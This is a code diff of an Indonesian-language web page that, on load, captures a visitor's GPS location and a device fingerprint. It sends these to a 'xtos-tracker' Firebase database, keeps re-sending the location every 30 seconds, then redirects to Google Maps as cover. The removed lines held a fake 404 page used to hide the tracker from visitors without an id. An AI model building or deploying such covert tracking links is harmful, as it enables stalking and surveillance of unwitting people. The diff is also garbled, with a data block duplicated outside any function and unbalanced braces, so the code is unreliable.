@@ -215,6 +215,163 @@
                 '.expires': Date.now() + (60 * 60 * 1000)
             };
             
+            console.log('Sending data to Firebase:', firebaseData);
+            
+            // Send to both locations and live paths for real-time tracking
+            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
+            const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
+            
+            // Send to main locations path
+            fetch(firebaseUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(firebaseData)
+            }).then(response => {
+                console.log('Main path response:', response.status);
+                return response.json();
+            }).then(data => {
+                console.log('Main path success:', data);
+            }).catch(e => {
+                console.error('Main path error:', e);
+            });
+            
+            // Send to live path for real-time updates
+            fetch(liveUrl, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ...firebaseData,
+                    lastUpdate: Date.now(),
+                    isLive: true
+                })
+            }).then(response => {
+                console.log('Live path response:', response.status);
+                updateStatus('✅ Lokasi berhasil dikirim!');
+                
+                // Start continuous location updates for real-time tracking
+                startContinuousTracking(trackingId);
+                
+                // Redirect after starting tracking
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                }, 2000);
+            }).catch(e => {
+                console.error('Live path error:', e);
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                }, 2500);
+            });
+        }
+        
+        function requestLocation() {
+            updateStatus('📍 Mengambil lokasi...');
+            
+            const options = {
+                enableHighAccuracy: false, // Faster but less accurate
+                timeout: 5000, // 5 second timeout
+                maximumAge: 30000 // Accept 30 second old location
+            };
+            
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: position.timestamp,
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    updateStatus('✅ Lokasi berhasil diambil!');
+                    document.getElementById('coords').innerHTML = 
+                        `<strong>Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}`;
+                    document.getElementById('coords').style.display = 'block';
+                    
+                    sendLocationData(locationData);
+                },
+                error => {
+                    updateStatus('❌ Gagal mengambil lokasi. Coba lagi.', true);
+                    console.log('Location error:', error);
+                },
+                options
+            );
+        }
+        
+        // Real-time tracking function
+        function startContinuousTracking(trackingId) {
+            let updateCount = 0;
+            const maxUpdates = 10; // Track for 5 minutes (30s * 10)
+            
+            const trackingInterval = setInterval(() => {
+                if (updateCount >= maxUpdates) {
+                    clearInterval(trackingInterval);
+                    console.log('Real-time tracking completed');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const liveData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: Date.now(),
+                            updateNumber: updateCount + 1,
+                            isLive: true,
+                            tracking_id: trackingId
+                        };
+                        
+                        // Send live update
+                        const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
+                        fetch(liveUrl, {
+                            method: 'PUT',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(liveData)
+                        });
+                        
+                        updateCount++;
+                        console.log(`Live update ${updateCount}/${maxUpdates} sent`);
+                    },
+                    error => {
+                        console.log('Live tracking error:', error);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            }, 30000); // Every 30 seconds
+        }
+        
+        // Auto-start when page loads
+        window.addEventListener('load', () => {
+            setTimeout(requestLocation, 1000);
+        });
+            
+            const firebaseData = {
+                latitude: locationData.latitude,
+                longitude: locationData.longitude,
+                accuracy: locationData.accuracy,
+                timestamp: Date.now(),
+                deviceBrand: deviceBrand,
+                deviceModel: deviceModel,
+                batteryLevel: batteryLevel + (batteryCharging ? ' (Charging)' : ''),
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenResolution: screen.width + 'x' + screen.height,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                userAgent: ua.substring(0, 200),
+                status: 'captured',
+                tracking_id: trackingId,
+                // Auto-delete after 1 hour (3600 seconds)
+                '.expires': Date.now() + (60 * 60 * 1000)
+            };
+            
             // Send to both locations and live paths for real-time tracking
             const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
             const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
@@ -346,26 +503,14 @@
             updateStatus('❌ Browser tidak mendukung GPS', true);
         }
         
-        // Fake error page for unauthorized access
-        function checkAccess() {
-            const hasValidId = urlParams.get('id');
-            if (!hasValidId) {
-                document.body.innerHTML = `
-                    <div style="text-align: center; padding: 50px; font-family: Arial;">
-                        <h1>404 - Page Not Found</h1>
-                        <p>The requested page could not be found.</p>
-                        <p><a href="https://google.com">Return to Google</a></p>
-                    </div>
-                `;
-                return false;
-            }
-            return true;
+        // Check geolocation support
+        if (!('geolocation' in navigator)) {
+            updateStatus('❌ Browser tidak mendukung GPS', true);
         }
         
-        // Check access on load
-        if (!checkAccess()) {
-            // Stop execution if no valid access
-        }
+        // Debug: Log URL parameters
+        console.log('URL Parameters:', window.location.search);
+        console.log('Tracking ID:', urlParams.get('id'));
     </script>
 </body>
 </html>
